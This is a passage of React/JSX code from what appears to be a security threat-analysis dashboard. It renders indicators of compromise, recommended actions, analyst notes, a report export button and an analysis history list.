                </div>
              </div>

              <div style={{ gridColumn:"1 / -1", background:"#0d1517", border:"1px solid #1a2e24", padding:20 }}>
                <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:12 }}>// INDICATORS OF COMPROMISE</div>
                {result.iocs?.length > 0 ? (
                  <div style={{ display:"flex", flexWrap:"wrap", gap:8 }}>
                    {result.iocs.map((ioc, i) => (
                      <span key={i} className="ioc-tag" style={{
                        background:"rgba(0,255,136,0.06)", border:"1px solid #1a3a28",
                        padding:"4px 10px", fontSize:11, color:"#5aaa7a",
                        letterSpacing:0.5, transition:"background 0.15s", cursor:"default"
                      }}>{ioc}</span>
                    ))}
                  </div>
                ) : (
                  <div style={{ fontSize:11, color:"#3a5a48" }}>No discrete IOCs extracted — review raw input manually.</div>
                )}
              </div>

              <div style={{ gridColumn:"1 / -1", background:"#0a1812", border:`1px solid ${sev.color}33`, padding:20 }}>
                <div style={{ fontSize:10, color:sev.color, opacity:0.6, letterSpacing:2, marginBottom:8 }}>// RECOMMENDED ACTION</div>
                <div style={{ fontSize:13, color:"#c9d8d3", lineHeight:1.7 }}>→ {result.recommended_action}</div>
              </div>

              {result.analyst_notes && (
                <div style={{ gridColumn:"1 / -1", background:"#0d1517", border:"1px solid #1a2e24", padding:20 }}>
                  <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:8 }}>// ANALYST NOTES</div>
                  <div style={{ fontSize:11, color:"#5a8a6a", lineHeight:1.7 }}>{result.analyst_notes}</div>
                </div>
              )}
            </div>

            <button className="export-btn" onClick={exportReport} style={{
              background:"transparent", border:"1px solid #1a2e24",
              color:"#5a8a6a", padding:"10px 24px", fontSize:11,
              cursor:"pointer", letterSpacing:2, fontFamily:"inherit",
              marginTop:12, transition:"all 0.15s"
            }}>
              ↓ EXPORT REPORT (.txt)
            </button>
          </div>
        )}

        {/* History */}
        {history.length > 0 && (
          <div style={{ marginTop:48 }}>
            <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:12 }}>// ANALYSIS HISTORY</div>
            {history.map((h, i) => {
              const s = SEVERITY_CONFIG[h.result.severity] || SEVERITY_CONFIG.INFORMATIONAL;
              return (
                <div key={i} style={{ display:"flex", alignItems:"center", gap:12, padding:"10px 0", borderBottom:"1px solid #0f1e18", fontSize:11 }}>
                  <span style={{ color:"#3a5a48", width:60, flexShrink:0 }}>{h.ts}</span>
                  <span style={{ color:s.color, width:80, flexShrink:0, fontFamily:"'Orbitron',monospace", fontSize:10 }}>{s.label}</span>
                  <span style={{ color:"#5a8a6a", flexShrink:0 }}>{h.result.threat_type}</span>
                  <span style={{ color:"#3a5a48", marginLeft:"auto", maxWidth:260, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>{h.input}</span>
                </div>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
}
